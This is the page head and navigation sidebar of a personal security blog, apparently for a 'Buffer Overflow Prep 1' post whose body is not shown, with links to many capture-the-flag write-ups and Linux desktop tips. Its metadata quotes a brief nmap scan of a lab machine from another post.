<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Buffer Overflow Prep 1 | Peanutstick</title>
  <meta name="keywords" content=" Buffer overflow ">
  <meta name="description" content="Buffer Overflow Prep 1 | Peanutstick">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="nmapnmap -p- -T5 -sV -vvv 10.10.210.193 Output: PORT      STATE    SERVICE     REASON      VERSION 22&#x2F;tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF VulnNet Internal">
<meta property="og:url" content="https://peanutstick.github.io/post/CTF%20VulnNet%20Internal.html">
<meta property="og:site_name" content="Peanutstick">
<meta property="og:description" content="nmapnmap -p- -T5 -sV -vvv 10.10.210.193 Output: PORT      STATE    SERVICE     REASON      VERSION 22&#x2F;tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.imgur.com/0ZlNChN.png">
<meta property="og:image" content="https://i.imgur.com/ev9bL5y.png">
<meta property="og:image" content="https://i.imgur.com/2bQkQaG.png">
<meta property="og:image" content="https://i.imgur.com/wVLajsv.png">
<meta property="og:image" content="https://i.imgur.com/9UkA58M.png">
<meta property="og:image" content="https://i.imgur.com/PqBLArN.png">
<meta property="og:image" content="https://i.imgur.com/aay4oot.png">
<meta property="og:image" content="https://i.imgur.com/pDykvq7.png">
<meta property="og:image" content="https://i.imgur.com/RRUzr5v.png">
<meta property="og:image" content="https://i.imgur.com/i0OQxk7.png">
<meta property="og:image" content="https://i.imgur.com/u1uiApo.png">
<meta property="og:image" content="https://i.imgur.com/WFN0l8S.png">
<meta property="og:image" content="https://i.imgur.com/93fLf8I.png">
<meta property="og:image" content="https://i.imgur.com/t6n9yjj.png">
<meta property="article:published_time" content="2023-04-25T15:21:16.510Z">
<meta property="article:modified_time" content="2023-04-25T15:25:05.111Z">
<meta property="article:author" content="Peanutstick">
<meta property="article:tag" content="Pivot">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/0ZlNChN.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>


<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>


<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 5.4.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="true">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>Peanutstick</span>
</div>

<div class="icon">
    
        
    
        
            <a title="github"
               href="https://github.com/Peanutstick"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
            <a title="reddit"
               href="https://www.reddit.com/user/benjy500c/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-reddit"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(97)</small>
            
        </div>
    </li>
    
        
            
                <li>
                    <div data-rel="CTF">
                        
                        CTF
                        <small>(63)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="dev">
                        
                        dev
                        <small>(1)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Fix">
                        
                        Fix
                        <small>(2)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="OS">
                        
                        OS
                        <small>(23)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Security">
                        
                        Security
                        <small>(3)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="Tips">
                        
                        Tips
                        <small>(2)</small>
                        
                    </div>
                    
                </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="97">
<input type="hidden" id="yelog_site_word_count" value="50k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
            
            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="æœç´¢ å¿«æ·é”® i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="åˆ‡æ¢åˆ°å¤§çº²è§†å›¾ å¿«æ·é”® w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="è¿”å›ž"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="å¤§å°å†™æ•æ„Ÿ"></i>
            <i class="iconfont icon-tag" data-title="æ ‡ç­¾"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">Contents</div>
            <i class="iconfont icon-list" data-title="åˆ‡æ¢åˆ°æ–‡ç« åˆ—è¡¨"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>api</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>arch</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Arch</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>bruteforce</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Buffer overflow</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>cms</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>CMS</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>CVE</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>database</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ffmpeg</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IRC</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>lfi</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>LFI</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pivot</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Pivot</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>privesc</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pwn</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>rice</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Rice</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sql</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqli</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqlmap</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>SSTI</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>steganography</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>tor</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>VPN</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>webserver</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Windows</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Youtube</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a  class="All CTF "
           href="/post/CTF%20VulnNet%20Internal.html"
           data-tag="Pivot"
           data-author="" >
            <span class="post-title" title="CTF VulnNet Internal">CTF VulnNet Internal</span>
            <span class="post-date" title="2023-04-25 17:21:16">2023/04/25</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Tokyo%20Ghoul.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Tokyo Ghoul">CTF Tokyo Ghoul</span>
            <span class="post-date" title="2023-04-23 17:42:00">2023/04/23</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Flatline.html"
           data-tag="Windows"
           data-author="" >
            <span class="post-title" title="CTF Flatline">CTF Flatline</span>
            <span class="post-date" title="2023-04-21 13:42:00">2023/04/21</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Tech_Supp0rt%201.html"
           data-tag="CMS"
           data-author="" >
            <span class="post-title" title="CTF Tech_Supp0rt 1">CTF Tech_Supp0rt 1</span>
            <span class="post-date" title="2023-04-20 03:46:00">2023/04/20</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Olympus.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Olympus">CTF Olympus</span>
            <span class="post-date" title="2023-04-19 03:46:00">2023/04/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Archangel.html"
           data-tag="LFI"
           data-author="" >
            <span class="post-title" title="CTF Archangel">CTF Archangel</span>
            <span class="post-date" title="2023-04-17 02:15:00">2023/04/17</span>
        </a>
        
        <a  class="All "
           href="/post/Keyboards.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Keyboars">Keyboars</span>
            <span class="post-date" title="2023-04-16 02:15:00">2023/04/16</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Road.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Road">CTF Road</span>
            <span class="post-date" title="2023-04-15 02:15:00">2023/04/15</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Mustacchio.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Mustacchio">CTF Mustacchio</span>
            <span class="post-date" title="2023-04-14 02:15:00">2023/04/14</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20socker.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF socker">CTF socker</span>
            <span class="post-date" title="2023-04-13 06:15:00">2023/04/13</span>
        </a>
        
        <a  class="All Security "
           href="/post/CVE-2023-24055%20KeePass%202.5x.html"
           data-tag="CVE"
           data-author="" >
            <span class="post-title" title="CVE-2023-24055 KeePass 2.5x">CVE-2023-24055 KeePass 2.5x</span>
            <span class="post-date" title="2023-04-12 17:11:29">2023/04/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Year%20of%20the%20Rabbit.html"
           data-tag="steganography"
           data-author="" >
            <span class="post-title" title="CTF Year of the Rabbit">CTF Year of the Rabbit</span>
            <span class="post-date" title="2023-04-12 16:14:27">2023/04/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/sqlhell.html"
           data-tag="sql"
           data-author="" >
            <span class="post-title" title="CTF sqlhell">CTF sqlhell</span>
            <span class="post-date" title="2023-04-10 20:14:00">2023/04/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Inject.html"
           data-tag="lfi"
           data-author="" >
            <span class="post-title" title="CTF inject">CTF inject</span>
            <span class="post-date" title="2023-04-05 03:20:00">2023/04/05</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Stocker.html"
           data-tag="lfi"
           data-author="" >
            <span class="post-title" title="CTF inject">CTF inject</span>
            <span class="post-date" title="2023-04-05 03:20:00">2023/04/05</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Year%20of%20the%20Owl.html"
           data-tag="Windows"
           data-author="" >
            <span class="post-title" title="CTF Year of the Owl">CTF Year of the Owl</span>
            <span class="post-date" title="2023-03-25 10:15:00">2023/03/25</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Bugged.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Bugged">CTF Bugged</span>
            <span class="post-date" title="2023-03-09 09:00:00">2023/03/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Intro%20To%20Pwntools.html"
           data-tag="Buffer overflow"
           data-author="" >
            <span class="post-title" title="Intro To Pwntools">Intro To Pwntools</span>
            <span class="post-date" title="2023-03-01 07:40:00">2023/03/01</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Buffer%20Overflow%20Prep%202.html"
           data-tag="Buffer overflow"
           data-author="" >
            <span class="post-title" title="Buffer Overflow Prep 2">Buffer Overflow Prep 2</span>
            <span class="post-date" title="2023-02-27 00:10:00">2023/02/27</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Buffer%20Overflow%20Prep%201.html"
           data-tag="Buffer overflow"
           data-author="" >
            <span class="post-title" title="Buffer Overflow Prep 1">Buffer Overflow Prep 1</span>
            <span class="post-date" title="2023-02-26 04:30:00">2023/02/26</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20BoilCTF.html"
           data-tag="Buffer overflow"
           data-author="" >
            <span class="post-title" title="CTF BoilCTF">CTF BoilCTF</span>
            <span class="post-date" title="2023-02-20 02:00:00">2023/02/20</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Wekor.html"
           data-tag="sqli"
           data-author="" >
            <span class="post-title" title="CTF Wekor">CTF Wekor</span>
            <span class="post-date" title="2023-02-19 11:57:00">2023/02/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_Plotted-LMS.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Plotted-LMS">CTF Plotted-LMS</span>
            <span class="post-date" title="2023-02-16 22:30:00">2023/02/16</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Install%20of%20kali%20on%20Arch%20with%20QEMU.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Install Kali with QEMU">Install Kali with QEMU</span>
            <span class="post-date" title="2023-02-11 08:56:00">2023/02/11</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Wgel%20CTF.html"
           data-tag="privesc"
           data-author="" >
            <span class="post-title" title="CTF Wgel CTF">CTF Wgel CTF</span>
            <span class="post-date" title="2023-02-06 02:20:00">2023/02/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Ignite.html"
           data-tag="CMS"
           data-author="" >
            <span class="post-title" title="CTF Ignite">CTF Ignite</span>
            <span class="post-date" title="2023-01-30 01:20:00">2023/01/30</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Learn%20CTF%20on%20windows.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Learn CTF on windows">Learn CTF on windows</span>
            <span class="post-date" title="2023-01-15 02:26:00">2023/01/15</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Relevant.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Relevant">CTF Relevant</span>
            <span class="post-date" title="2023-01-13 18:18:00">2023/01/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Ted.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Ted">CTF Ted</span>
            <span class="post-date" title="2023-01-13 18:18:00">2023/01/13</span>
        </a>
        
        <a  class="All Tips "
           href="/post/Bypass%20yt%20restriction.html"
           data-tag="Youtube"
           data-author="" >
            <span class="post-title" title="Bypass yt restriction">Bypass yt restriction</span>
            <span class="post-date" title="2023-01-13 05:25:00">2023/01/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Daily%20Bugle.html"
           data-tag="CMS"
           data-author="" >
            <span class="post-title" title="CTF Daily Bugle">CTF Daily Bugle</span>
            <span class="post-date" title="2023-01-13 02:20:00">2023/01/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Internal.html"
           data-tag="CMS"
           data-author="" >
            <span class="post-title" title="CTF Daily Bugle">CTF Daily Bugle</span>
            <span class="post-date" title="2023-01-12 02:20:00">2023/01/12</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Mr%20Robot.html"
           data-tag="CMS"
           data-author="" >
            <span class="post-title" title="CTF Mr Robot">CTF Mr Robot</span>
            <span class="post-date" title="2023-01-09 09:51:00">2023/01/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20SecretRezip.html"
           data-tag="pwn"
           data-author="" >
            <span class="post-title" title="CTF SecretRezip">CTF SecretRezip</span>
            <span class="post-date" title="2022-11-11 03:25:00">2022/11/11</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Hackfest%202016.html"
           data-tag="cms"
           data-author="" >
            <span class="post-title" title="CTF Hackfest 2016">CTF Hackfest 2016</span>
            <span class="post-date" title="2022-10-27 04:21:00">2022/10/27</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Micro%20Storage.html"
           data-tag="pwn"
           data-author="" >
            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
            <span class="post-date" title="2022-10-17 06:25:00">2022/10/17</span>
        </a>
        
        <a  class="All CTF "
           href="/post/Eternal%20Loop.html"
           data-tag="pwn"
           data-author="" >
            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
            <span class="post-date" title="2022-09-26 10:15:00">2022/09/26</span>
        </a>
        
        <a  class="All OS "
           href="/post/Fresh%20install%20of%20Arch.html"
           data-tag="Arch"
           data-author="" >
            <span class="post-title" title="Fresh install of Arch">Fresh install of Arch</span>
            <span class="post-date" title="2022-07-10 03:30:00">2022/07/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/DIGITALWORLD%20FALL.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="DIGITALWORLD: FALL ">DIGITALWORLD: FALL </span>
            <span class="post-date" title="2022-07-03 06:30:52">2022/07/03</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Victim1.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Victim1">CTF Victim1</span>
            <span class="post-date" title="2022-06-27 07:48:00">2022/06/27</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Silky%200x01.html"
           data-tag="bruteforce"
           data-author="" >
            <span class="post-title" title="CTF Silky 0x01">CTF Silky 0x01</span>
            <span class="post-date" title="2022-06-13 02:44:00">2022/06/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Beelzebub.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Beelzebub">CTF Beelzebub</span>
            <span class="post-date" title="2022-06-10 03:29:00">2022/06/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Shibboleth.html"
           data-tag="bruteforce"
           data-author="" >
            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
            <span class="post-date" title="2022-03-13 07:29:00">2022/03/13</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20PwnLab.html"
           data-tag="database"
           data-author="" >
            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
            <span class="post-date" title="2022-03-06 11:07:00">2022/03/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20simple%20CTF.html"
           data-tag="cms"
           data-author="" >
            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
            <span class="post-date" title="2022-03-03 01:20:00">2022/03/03</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20hacker%20kid.html"
           data-tag="SSTI"
           data-author="" >
            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
            <span class="post-date" title="2022-02-28 03:19:00">2022/02/28</span>
        </a>
        
        <a  class="All OS "
           href="/post/How%20to%20gain%20some%20GiB%20on%20Arch%20Linux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
            <span class="post-date" title="2022-02-21 03:15:00">2022/02/21</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Jordaninfosec.html"
           data-tag="privesc"
           data-author="" >
            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
            <span class="post-date" title="2022-02-18 05:11:00">2022/02/18</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Deathnote.html"
           data-tag="cms"
           data-author="" >
            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
            <span class="post-date" title="2022-02-08 09:20:00">2022/02/08</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Paper.html"
           data-tag="cms"
           data-author="" >
            <span class="post-title" title="CTF Paper">CTF Paper</span>
            <span class="post-date" title="2022-02-06 11:07:00">2022/02/06</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Pandora.html"
           data-tag="pivot"
           data-author="" >
            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
            <span class="post-date" title="2022-02-05 08:30:00">2022/02/05</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Meta.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Meta">CTF Meta</span>
            <span class="post-date" title="2022-02-02 10:15:00">2022/02/02</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Secret.html"
           data-tag="api"
           data-author="" >
            <span class="post-title" title="CTF Secret">CTF Secret</span>
            <span class="post-date" title="2022-01-31 07:29:00">2022/01/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Backdoor.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
            <span class="post-date" title="2022-01-30 05:19:00">2022/01/30</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Horizontall.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
            <span class="post-date" title="2022-01-24 03:42:00">2022/01/24</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Toppo.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
            <span class="post-date" title="2022-01-23 00:54:00">2022/01/23</span>
        </a>
        
        <a  class="All OS "
           href="/post/Wallpaper%20selector%20with%20sxiv.html"
           data-tag="Rice"
           data-author="" >
            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
            <span class="post-date" title="2022-01-22 09:35:00">2022/01/22</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20cybersploit.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
            <span class="post-date" title="2022-01-22 03:19:00">2022/01/22</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20unknowndevice64-1.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
            <span class="post-date" title="2022-01-20 03:51:00">2022/01/20</span>
        </a>
        
        <a  class="All OS "
           href="/post/Record%20screen%20with%20ffmpeg.html"
           data-tag="ffmpeg"
           data-author="" >
            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
            <span class="post-date" title="2022-01-19 08:56:00">2022/01/19</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Stapler.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
            <span class="post-date" title="2022-01-15 08:07:00">2022/01/15</span>
        </a>
        
        <a  class="All OS "
           href="/post/Create%20a%20polybar%20module.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
            <span class="post-date" title="2022-01-13 06:09:00">2022/01/13</span>
        </a>
        
        <a  class="All OS "
           href="/post/Replacing%20xfce4%20bar%20by%20Polybar.html"
           data-tag="rice"
           data-author="" >
            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
            <span class="post-date" title="2022-01-12 07:57:00">2022/01/12</span>
        </a>
        
        <a  class="All OS "
           href="/post/Cut%20an%20online%20video%20with%20ffmpeg.html"
           data-tag="ffmpeg"
           data-author="" >
            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
            <span class="post-date" title="2022-01-11 10:15:00">2022/01/11</span>
        </a>
        
        <a  class="All OS "
           href="/post/Create%20a%20locale%20stream.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
            <span class="post-date" title="2022-01-10 02:18:00">2022/01/10</span>
        </a>
        
        <a  class="All OS "
           href="/post/CTF_SickOs.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
            <span class="post-date" title="2022-01-09 08:15:00">2022/01/09</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Dinae.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
            <span class="post-date" title="2022-01-09 05:16:00">2022/01/09</span>
        </a>
        
        <a  class="All OS "
           href="/post/Switch%20from%20i3%20to%20bspwm.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
            <span class="post-date" title="2022-01-01 08:37:00">2022/01/01</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Fix%20my%20spyware%20is%20stuck%20in%20the%20login%20loop%20(Microsoft%20teams).html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="my spyware is stuck in the login loop (Microsoft teams)">my spyware is stuck in the login loop (Microsoft teams)</span>
            <span class="post-date" title="2021-12-28 04:15:00">2021/12/28</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20IMF.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF IMF">CTF IMF</span>
            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Tr0ll.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
        </a>
        
        <a  class="All OS "
           href="/post/How%20do%20I%20setup%20nitrogen%20&%20pywal.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
            <span class="post-date" title="2021-12-25 10:15:00">2021/12/25</span>
        </a>
        
        <a  class="All OS "
           href="/post/Setup_Xfce_with_i3.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Setup Xfce with i3">Setup Xfce with i3</span>
            <span class="post-date" title="2021-12-24 12:17:00">2021/12/24</span>
        </a>
        
        <a  class="All OS "
           href="/post/Set%20up%20port%20knocking%20server%20to%20hide%20an%20open%20port.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
            <span class="post-date" title="2021-10-31 08:15:00">2021/10/31</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Ambassador.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Ambassador">CTF Ambassador</span>
            <span class="post-date" title="2021-10-10 11:09:00">2021/10/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20M0rsarchive.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF M0rsarchive">CTF M0rsarchive</span>
            <span class="post-date" title="2021-10-10 11:09:00">2021/10/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Photobomb.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Photobomb">CTF Photobomb</span>
            <span class="post-date" title="2021-10-10 02:09:00">2021/10/10</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Trick.html"
           data-tag="sqlmap"
           data-author="" >
            <span class="post-title" title="CTF Trick">CTF Trick</span>
            <span class="post-date" title="2021-10-06 09:40:00">2021/10/06</span>
